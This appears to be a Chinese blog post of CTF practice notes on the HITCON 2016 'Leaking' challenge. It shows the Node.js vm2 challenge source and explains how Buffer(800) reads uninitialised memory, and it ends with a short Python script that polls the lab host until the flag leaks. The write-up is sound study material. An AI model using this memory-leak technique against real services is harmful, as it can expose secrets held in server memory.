---
title: HITCON2016-Leaking
date: 2025-05-30 19:15:58
tags:
- node.js沙箱逃逸
- JS通过Buffer 类处理二进制数据的缓冲区
category:
- 刷题笔记
---

# HITCON2016-Leaking

源码：

```
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

其中定义了变量flag，并且存在eval()函数，可能是需要命令执行，并且注释也提示了flag被藏在这里。查看到前面有var { VM } = require("vm2");，查阅资料后，得知是Node.js 官方安全沙箱的库，参考资料NPM酷库：vm2，安全的沙箱环境

### VM2原理

VM2基于VM，使用官方的VM库构建沙箱环境。然后使用JavaScript的Proxy技术来防止沙箱脚本逃逸。

### vm2 特性

运行不受信任的JS脚本
沙箱的终端输出信息完全可控
沙箱内可以受限地加载modules
可以安全地向沙箱间传递callback
死循环攻击免疫 while (true) {}
node.js沙箱逃逸是个知识盲区，查阅了大佬的wp[HITCON 2016]Leaking node.js沙箱逃逸

在较早一点的node.js版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。

### 关于 Buffer

JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。
但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。

只要是调用过的变量，一定会存在内存中，所以需要使用Buffer()来读取内存，使用data=Buffer(800)分配一个800的单位为8位字节的buffer，编写Python3的EXP：


```
import requests

url = 'http://f81a9cf8-9be7-4245-96fe-da986bbe60e1.node3.buuoj.cn/?data=Buffer(800)'

while True:
    res = requests.get(url)
    print(res.status_code)

    if 'hitcon{' in res.text:
        print(res.text)
        break
```























